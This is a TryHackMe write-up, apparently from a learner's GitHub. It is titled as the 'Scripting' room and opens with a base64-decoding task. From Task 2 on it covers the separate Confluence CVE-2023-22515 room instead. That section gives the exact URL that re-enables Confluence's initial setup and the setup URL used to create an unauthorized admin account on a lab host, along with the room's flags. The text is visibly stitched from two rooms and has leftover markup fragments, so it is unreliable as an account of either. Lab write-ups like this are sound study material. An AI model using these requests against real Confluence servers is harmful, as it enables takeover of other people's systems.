<p align="center">November 10, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{188}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ Scripting }}$$ </h1>
<p align="center">Learn basic scripting by solving some challenges!</p>
<p align="center">Access this TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/scripting">Scripting</a>.</p>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/5061cdbe-980e-4ba0-ae69-60d5a10fdbf2"><br>
  <img width="900px" src="https://github.com/user-attachments/assets/8da56663-625c-460d-8f5a-9459bbff4d89">
</p>


<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [2. Understanding the Vulnerability](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [3. Automating Exploitation](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Patching](#4) &nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusion](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<br>
<br>
<br>
<h2 align="center">Task 1. [Easy] Base64`<a id='1'></a></h2>
<p>This file has been base64 encoded 50 times - write a script to retrieve the flag. Here is the general process to do this:</p>p>

<p>......................</p>

<p>Try do this in both Bash and Python!</p>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 1.1. <em>What is the final string?</em><br><a id='1.1'></a>
>> <code><strong>HackBack2019=</strong></code>

<br>
<p>I downloaded room´s file and renamed it as <code>THMscripting.txt</code>.</p>


<p>Called the following file <code>THMctf.py</code>.</p>
<pre><code>
import base64

#Open file
with open('THMscripting.txt') as f:
    msg = f.read()

#Decode 50 times
for _ in range(50):
    msg = base64.b64decode(msg)

print(f"The flag is: {msg.decode('utf8')}")
</code></pre>

<pre><code>

</code></pre>

<p>After running the file with Python3 I got the flag.</p>
<pre><code>
python3 THMctf.py                
The flag is: HackBack2019=
</code></pre>

<br>
<h2 align="center">Task 2. Understanding the Vulnerability<a id='2'></a></h2>
<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [1. Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [2. Understanding the Vulnerability](#2) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [3. Automating Exploitation](#3) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [4. Detection and Patching](#4) &nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[5. Conclusion](#5) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp;  [6. Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;▪️&nbsp;&nbsp;&nbsp;&nbsp; [7. My Journey](#7)

<h3>Confluence's Initial Setup</h3>
<p>When running Confluence for the first time, you'll go through the initial setup, which allows you to configure some basic parameters and create an administrative account. The initial setup can be reached by navigating to http://10.10.245.48:8090/setup/.<br>

If you try to access the initial setup after you have completed it, you won't be able to go through the setup again but will be greeted with a message stating that the setup process is already complete:

<p align="center"> <img width="550px" src="https://github.com/user-attachments/assets/e0777bdc-6e71-4d20-af3f-e6dbed34e6f4"></p>

<p>This is normal expected behaviour and would normally not be useful for an attacker at all.</p>

<h3>Enter CVE-2023-22515</h3>
<p>This vulnerability allows an attacker to reenable the initial setup process. In doing so, the attacker can go through the step of creating a new administrator all over again.<br>

This is all possible because Confluence is built using the Apache Struts framework, which depends on the XWork package. XWork allows you to define Actions in the form of a Java class. Each Action can be invoked through a URL, and the corresponding Java class will handle the request, do whatever the Action requires, and emit a response.<br>

To clarify how Actions work, navigate to http://10.10.245.48:8090/. You should immediately be redirected to http://10.10.245.48:8090/login.action. This URL calls an Action bound to a Java class to handle login attempts. When an Action is invoked through its URL, the execute() method of the class will be called by default.</p>

<h3>Calling Getters/Setters via XWorks</h3>
<p>Calling Getters/Setters via XWorks </p>

<pre><code>$
http://10.10.245.48:8090/login.action?Id=123
</code></pre>

<p>This would execute setId('123') as defined in the corresponding Action class.</p>

<h3>Chaining Getters/Setters to Reenable the Initial Setup</h3>
<p>The reported exploit takes advantage of the ServerInfoAction Action. The reason for picking this specific Action is that we can build a chain of getters/setters from it to set the configuration parameter that turns the initial setup on or off.<br>

If you analyse the code of the ServerInfoAction class, you'll see it extends the ConfluenceActionSupport class. By doing so, it will inherit all of its methods as well. One such method is a getter that returns a BootstrapStatusProvider object:</p>

<pre><code>
public class ConfluenceActionSupport extends ActionSupport implements LocaleProvider, WebInterface, MessageHolderAware {
  public BootstrapStatusProvider getBootstrapStatusProvider() {
    if (this.bootstrapStatusProvider == null)
      this.bootstrapStatusProvider = BootstrapStatusProviderImpl.getInstance(); 
    return this.bootstrapStatusProvider;
  }
}
</code></pre>

<p>We care about the BootstrapStatusProvider class because it has another getter method we can use to retrieve an ApplicationConfiguration object:</p>

<pre><code>
public class BootstrapStatusProviderImpl implements BootstrapStatusProvider, BootstrapManagerInternal {
  public ApplicationConfiguration getApplicationConfig() {
    return this.delegate.getApplicationConfig();
  }
}
</code></pre>

<p>As you have probably guessed by now, this object contains the application's configuration, including an attribute that tells Confluence if the initial setup has been finished. Such attribute can be modified by using a setter in the ApplicationConfig class:</p>

<pre><code>$
public class ApplicationConfig implements ApplicationConfiguration {
  public synchronized void setSetupComplete(boolean setupComplete) {
    this.setupComplete = setupComplete;
  }  
}
</code></pre>

<p>If we call setSetupComplete(false), we will effectively reenable the initial setup. Putting it all together, we can call that chain of getters/setters by accessing the following URL:</p>

<pre><code>
http://10.10.245.48:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
</code></pre>

<p>This will be effectively translated by XWork into a call to:</p>

<pre><code>
getBootstrapStatusProvider().getApplicationConfig().setSetupComplete(false)
</code></pre>

<p>Now, go to your browser and navigate to the crafted URL to trigger the vulnerability. You should get the following response from the server:</p>

![image](https://github.com/user-attachments/assets/bdb9e0ea-a749-4a19-9c8e-b40a9b45f2d0)


<h3>Creating an Admin Account</h3>
<p>Creating an Admin Account</p>

<pre><code>
http://10.10.245.48:8090/setup/setupadministrator-start.action
</code></pre>

<p>Fill in the details of your new admin user and click next:</p>

![image](https://github.com/user-attachments/assets/6723f455-8797-455a-a2d7-0c77cdaebc7d)

<p>If all goes well, you should get access to Confluence with administrative privileges!</p>

![image](https://github.com/user-attachments/assets/3475c636-a5f3-4d1b-98bd-1876ae532a39)

<p>In this task, we have gone through a quick explanation of the vulnerability. If you want a more in-depth look at the technical details, check Rapid7 analysis in attackerKB.</p>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>

> 2.1. <em>Log into Confluence with your new credentials. What is the value of the flag posted by admin?</em><br><a id='2.1'></a>
>> <code><strong>THM{who_needs_keys_anyway}</strong></code>

<br>


<pre><code>
http://confluence.thm:8090/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false
</code></pre>


![image](https://github.com/user-attachments/assets/4fab16e0-d9f3-45ca-a409-3524af133785)

<pre><code>
http://confluence.thm:8090/setup/setupadministrator-start.action
</code></pre>

![image](https://github.com/user-attachments/assets/c4a2ecf9-0e79-4a10-ae1e-a305d2200bf2)

<p>I registered and it worked.</p>

![image](https://github.com/user-attachments/assets/1a2eaa0c-941e-4451-ba03-c4c4c7573b60)

![image](https://github.com/user-attachments/assets/f318ab5b-da85-4f9e-8867-8d16a30b95a6)

![image](https://github.com/user-attachments/assets/e5cf7b4f-1cb2-45a5-9018-fb18a034c080)

![image](https://github.com/user-attachments/assets/55c49d05-2cf6-4997-bddd-74343082a1ea)

![image](https://github.com/user-attachments/assets/2eb2ee9e-c26b-412b-a123-15cb86137443)


<br>
<h2 align="center">Task 3. Automating Exploitation<a id='3'></a></h2>

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 3.1. <em>Read Chocapikk's script. What is the name of the Confluence user it creates?</em><br><a id='3.1'></a>
>> <code><strong>pleasepatch</strong></code>

<br>

<h2 align="center">Task 4. Detection and Patching<a id='4'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the questions below}}$$ </h3>
<br>

> 4.1. <em>Is Confluence Server version 8.2.0 vulnerable to CVE-2023-22515? (yea/nay)</em><br><a id='4.1'></a>
>> <code><strong>yea</strong></code>

<br>

> 4.2. <em>Does applying mitigation actions replace the need to upgrade Confluence? (yea/nay)</em><br><a id='4.2'></a>
>> <code><strong>nay</strong></code>

<br>

<h2 align="center">Task 5. Conclusion<a id='5'></a></h2>


<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 5.1. <em>Click and continue learning!</em><br><a id='5.1'></a>
>> <code><strong>No answer needed</strong></code>


<br>
<h2>Room Complete<a id='6'></a></h2>
<p>Keep learning, keep growing!</p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/773fd6e2-911c-425e-a473-4cd6e29a542c"></p>

<h2>My Journey<a id='7'></a></h2>
<p>Following I share the status of my journey in TryHackMe.</p>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     |
| :---------------: | :------- | :----------- | :----------- | :---------- | :--------- | :------  | :-------- |
|                   |          | WorldWide    | Brazil       | WorldWide   | Brazil     |          | Completed |
| November 10, 2024 | 188      |       1,248ª |          25ª |      4,316ª |        60ª | 54,668   |       414 |

</div>


<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/10769ca9-b470-4793-b160-992f31b613f7"></p>

<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>
